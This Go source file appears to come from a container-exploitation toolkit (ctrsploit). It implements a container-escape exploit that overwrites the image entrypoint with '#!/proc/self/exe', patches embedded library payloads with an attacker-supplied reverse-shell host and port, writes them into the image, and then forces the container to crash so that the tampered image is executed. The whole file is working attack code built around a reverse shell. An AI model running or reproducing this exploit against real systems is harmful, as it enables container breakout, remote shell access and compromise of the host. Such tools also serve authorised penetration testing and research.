package pipe_primitive

import (
	"bytes"
	"flag"
	"fmt"
	"github.com/ctrsploit/ctrsploit/helper/crash"
	"github.com/ctrsploit/ctrsploit/log"
	"github.com/ctrsploit/ctrsploit/util"
	"github.com/ssst0n3/awesome_libs/awesome_error"
	"os"
	"strconv"
	"strings"
)

func Escape(primitive Primitive) (err error) {
	flagSet := flag.NewFlagSet(imagePollutionExpName(primitive), flag.ContinueOnError)
	var host string
	var port uint
	flagSet.StringVar(&host, "LHOST", "", "the host of reverse shell")
	flagSet.UintVar(&port, "LPORT", 23333, "the port of reverse shell")
	awesome_error.CheckFatal(flagSet.Parse(os.Args[1:]))
	if port < 0 || port > 65535 {
		err = fmt.Errorf("port must be in [0, 65535], current is %d", port)
		log.Logger.Fatal(err)
	}
	err = OverwriteImageEntrypointAsSelf(primitive)
	if err != nil {
		return
	}
	for _, lib := range primitive.Library() {
		err = OverwriteLibrary(primitive, lib, host, port)
		if err != nil {
			return
		}
	}
	err = makeCrash()
	if err != nil {
		return
	}
	return
}

func OverwriteImageEntrypointAsSelf(primitive Primitive) error {
	return OverwriteImageEntrypoint(primitive, []byte("#!/proc/self/exe\n"))
}

func OverwriteLibrary(primitive Primitive, library Library, host string, port uint) (err error) {
	payload, err := replaceReverseShellAddress(library.Payload, host, port)
	if err != nil {
		return
	}
	return WriteImage(primitive, library.Path, payload)
}

func replaceReverseShellAddress(payload []byte, host string, port uint) (replaced []byte, err error) {
	var hostBytes []byte
	for _, ip := range strings.Split(host, ".") {
		var b int
		b, err = strconv.Atoi(ip)
		if err != nil {
			awesome_error.CheckErr(err)
			return
		}
		hostBytes = append(hostBytes, byte(b))
	}
	replaced = bytes.ReplaceAll(payload, []byte{0xff, 0xfe, 0xfd, 0xfc}, hostBytes)
	portBytes := []byte{
		byte(port >> 8), byte(port & 0xff),
	}
	replaced = bytes.ReplaceAll(replaced, []byte{0x5b, 0x25}, portBytes)
	return
}

func OverwriteImageEntrypoint(primitive Primitive, content []byte) (err error) {
	path, err := getEntrypointFilePath(primitive, 1)
	if err != nil {
		return
	}
	return WriteImage(primitive, path, content)
}

func getEntrypointFilePath(primitive Primitive, pid int) (path string, err error) {
	path = fmt.Sprintf("/proc/%d/exe", pid)
	if primitive.MinOffset() == 0 {
		return
	}
	shebang, err := util.IsSheBang(pid)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	if len(shebang) > 0 {
		path = shebang
	}
	return
}

func makeCrash() (err error) {
	return crash.MakeContainerCrash(crash.NewSig())
}
